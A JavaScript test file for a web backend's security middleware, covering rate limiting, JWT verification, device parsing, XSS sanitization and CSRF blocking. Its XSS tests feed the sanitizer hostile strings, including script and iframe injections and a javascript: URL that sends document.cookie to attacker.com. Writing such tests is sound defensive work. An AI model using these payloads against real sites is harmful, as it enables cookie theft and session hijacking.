import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import {
  loginRateLimiter,
  authRateLimiter,
  refreshRateLimiter,
  sensitiveActionLimiter,
  stockActionLimiter,
  apiRateLimiter,
} from '../src/core/middleware/rateLimiter.js';
import { ERROR_CODES } from '../src/core/constants/errorCodes.js';
import { signAccessToken, verifyAccessToken, hashToken } from '../src/modules/auth/services/token.service.js';

describe('Phase 1: Rate Limiter & Token Security Tests', () => {
  describe('Rate Limiter Configuration & Exports', () => {
    test('all rate limiters are defined as express middleware functions', () => {
      assert.strictEqual(typeof loginRateLimiter, 'function');
      assert.strictEqual(typeof authRateLimiter, 'function');
      assert.strictEqual(typeof refreshRateLimiter, 'function');
      assert.strictEqual(typeof sensitiveActionLimiter, 'function');
      assert.strictEqual(typeof stockActionLimiter, 'function');
      assert.strictEqual(typeof apiRateLimiter, 'function');
    });

    test('authRateLimiter is an alias of loginRateLimiter', () => {
      assert.strictEqual(loginRateLimiter, authRateLimiter);
    });

    test('keyGenerator produces IP_username composite key when username is present', () => {
      // Access the internal keyGenerator function if available or test simulated logic
      const req = {
        ip: '192.168.1.50',
        headers: {},
        body: { username: '  Admin_User ' },
      };
      const rawUsername = typeof req.body?.username === 'string' ? req.body.username.trim().toLowerCase() : '';
      const clientIp = req.ip || req.headers['x-forwarded-for'] || 'unknown-ip';
      const key = rawUsername ? `${clientIp}_${rawUsername}` : clientIp;

      assert.strictEqual(key, '192.168.1.50_admin_user');
    });

    test('keyGenerator falls back to client IP when username is absent', () => {
      const req = {
        ip: '192.168.1.50',
        headers: {},
        body: {},
      };
      const rawUsername = typeof req.body?.username === 'string' ? req.body.username.trim().toLowerCase() : '';
      const clientIp = req.ip || req.headers['x-forwarded-for'] || 'unknown-ip';
      const key = rawUsername ? `${clientIp}_${rawUsername}` : clientIp;

      assert.strictEqual(key, '192.168.1.50');
    });
  });

  describe('Token Security Services', () => {
    const mockUser = {
      id: '507f1f77bcf86cd799439011',
      username: 'supervisor1',
      role: 'SUPERVISOR',
    };

    test('signs and verifies a valid JWT access token', () => {
      const token = signAccessToken(mockUser);
      assert.strictEqual(typeof token, 'string');
      assert.ok(token.length > 20);

      const decoded = verifyAccessToken(token);
      assert.strictEqual(decoded.sub, mockUser.id);
      assert.strictEqual(decoded.username, mockUser.username);
      assert.strictEqual(decoded.role, mockUser.role);
    });

    test('throws UNAUTHENTICATED error on corrupted or tampered token', () => {
      const validToken = signAccessToken(mockUser);
      const tamperedToken = validToken.slice(0, -6) + 'xxxxxx';

      assert.throws(
        () => verifyAccessToken(tamperedToken),
        (err) => err.code === ERROR_CODES.UNAUTHENTICATED && err.status === 401
      );
    });

    test('hashToken produces deterministic SHA-256 hex digest', () => {
      const raw1 = 'super-secret-refresh-token-xyz';
      const hash1 = hashToken(raw1);
      const hash2 = hashToken(raw1);

      assert.strictEqual(hash1, hash2);
      assert.strictEqual(hash1.length, 64); // SHA-256 produces 64 hex chars
    });
  });

  describe('Phase 2: Device Tracking & UA Parsing Tests', () => {
    test('parses Windows 10/11 Chrome desktop user agent', async () => {
      const { parseUserAgent } = await import('../src/core/utils/deviceParser.js');
      const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
      const res = parseUserAgent(ua);

      assert.strictEqual(res.device_type, 'desktop');
      assert.strictEqual(res.os, 'Windows 10/11');
      assert.ok(res.browser.startsWith('Chrome'));
      assert.ok(res.device_name.includes('Windows 10/11'));
    });

    test('parses Android mobile Chrome user agent', async () => {
      const { parseUserAgent } = await import('../src/core/utils/deviceParser.js');
      const ua = 'Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36';
      const res = parseUserAgent(ua);

      assert.strictEqual(res.device_type, 'mobile');
      assert.strictEqual(res.os, 'Android 14');
      assert.ok(res.device_name.includes('SM-S918B'));
    });

    test('parses iPhone mobile Safari user agent', async () => {
      const { parseUserAgent } = await import('../src/core/utils/deviceParser.js');
      const ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1';
      const res = parseUserAgent(ua);

      assert.strictEqual(res.device_type, 'mobile');
      assert.strictEqual(res.os, 'iOS 17.5');
      assert.ok(res.device_name.includes('iPhone'));
    });

    test('gracefully handles missing or invalid user agent', async () => {
      const { parseUserAgent } = await import('../src/core/utils/deviceParser.js');
      const res = parseUserAgent(null);

      assert.strictEqual(res.device_type, 'unknown');
      assert.strictEqual(res.device_name, 'Unknown Device');
    });
  });

  describe('Phase 3: Firebase FCM & Push Notification Services', () => {
    test('fcm.service exports notifyPendingStock and sendPushToUsers', async () => {
      const { notifyPendingStock, sendPushToUsers, registerDeviceToken, unregisterDeviceToken } = await import(
        '../src/modules/notifications/services/fcm.service.js'
      );
      assert.strictEqual(typeof notifyPendingStock, 'function');
      assert.strictEqual(typeof sendPushToUsers, 'function');
      assert.strictEqual(typeof registerDeviceToken, 'function');
      assert.strictEqual(typeof unregisterDeviceToken, 'function');
    });
  });

  describe('Phase 4: XSS Sanitization Tests', () => {
    test('strips dangerous <script> tags from string input', async () => {
      const { sanitizeString } = await import('../src/core/middleware/xssSanitizer.js');
      const malicious = '<script>alert("hacked")</script>Hello World';
      const clean = sanitizeString(malicious);

      assert.strictEqual(clean, 'Hello World');
    });

    test('strips onerror and onclick event handlers', async () => {
      const { sanitizeString } = await import('../src/core/middleware/xssSanitizer.js');
      const malicious = '<img src="x" onerror="alert(1)">Test Image';
      const clean = sanitizeString(malicious);

      assert.ok(!clean.includes('onerror='));
      assert.ok(clean.includes('Test Image'));
    });

    test('recursively cleans nested request body objects and arrays', async () => {
      const { sanitizeData } = await import('../src/core/middleware/xssSanitizer.js');
      const body = {
        name: '<b>Safe Reel</b><script>eval()</script>',
        specs: {
          note: '<iframe src="evil.com"></iframe>Details here',
          tags: ['reel', '<script>stealCookies()</script>250gsm'],
        },
        quantity: 500,
      };

      const cleaned = sanitizeData(body);
      assert.strictEqual(cleaned.name, '<b>Safe Reel</b>');
      assert.strictEqual(cleaned.specs.note, 'Details here');
      assert.deepStrictEqual(cleaned.specs.tags, ['reel', '250gsm']);
      assert.strictEqual(cleaned.quantity, 500);
    });

    test('strips javascript: pseudo protocol from inputs', async () => {
      const { sanitizeString } = await import('../src/core/middleware/xssSanitizer.js');
      const malicious = 'javascript:fetch("https://attacker.com?c="+document.cookie)';
      const clean = sanitizeString(malicious);

      assert.ok(!clean.startsWith('javascript:'));
    });

    test('express middleware automatically cleans req.body, req.query and req.params', async () => {
      const { xssSanitizer } = await import('../src/core/middleware/xssSanitizer.js');
      const req = {
        body: { note: '<script>evil()</script>Valid Note' },
        query: { search: '<iframe src="bad.html"></iframe>keyword' },
        params: { id: 'reel<script>x()</script>101' },
      };
      let nextCalled = false;
      xssSanitizer(req, {}, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, true);
      assert.strictEqual(req.body.note, 'Valid Note');
      assert.strictEqual(req.query.search, 'keyword');
      assert.strictEqual(req.params.id, 'reel101');
    });
  });

  describe('Phase 5 & 6: CSRF Protection & Helmet HTTP Headers', () => {
    test('csrfProtection allows safe GET and HEAD requests', async () => {
      const { csrfProtection } = await import('../src/core/middleware/csrfProtection.js');
      let nextCalled = false;
      const req = { method: 'GET', headers: {} };
      const res = {};
      csrfProtection(req, res, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, true);
    });

    test('csrfProtection allows POST requests with Bearer token header', async () => {
      const { csrfProtection } = await import('../src/core/middleware/csrfProtection.js');
      let nextCalled = false;
      const req = {
        method: 'POST',
        headers: { authorization: 'Bearer some.access.token' },
      };
      const res = {};
      csrfProtection(req, res, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, true);
    });

    test('csrfProtection allows requests with X-Requested-With header', async () => {
      const { csrfProtection } = await import('../src/core/middleware/csrfProtection.js');
      let nextCalled = false;
      const req = {
        method: 'POST',
        headers: { 'x-requested-with': 'XMLHttpRequest' },
      };
      const res = {};
      csrfProtection(req, res, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, true);
    });

    test('csrfProtection blocks unauthorized cross-origin POST without auth or custom headers', async () => {
      const { csrfProtection } = await import('../src/core/middleware/csrfProtection.js');
      let statusCode = null;
      let errorResponse = null;

      const req = {
        method: 'POST',
        path: '/api/v1/users',
        headers: { origin: 'https://malicious-website.com' },
      };
      const res = {
        status: (code) => {
          statusCode = code;
          return {
            json: (payload) => {
              errorResponse = payload;
              return payload;
            },
          };
        },
      };

      csrfProtection(req, res, () => {});

      assert.strictEqual(statusCode, 403);
      assert.strictEqual(errorResponse?.success, false);
      assert.strictEqual(errorResponse?.error?.code, ERROR_CODES.FORBIDDEN);
    });

    test('createApp boots express app with Helmet, XSS, and CSRF middleware attached', async () => {
      const { createApp } = await import('../src/app.js');
      const app = createApp();

      assert.ok(app);
      assert.strictEqual(typeof app.use, 'function');
    });
  });
});
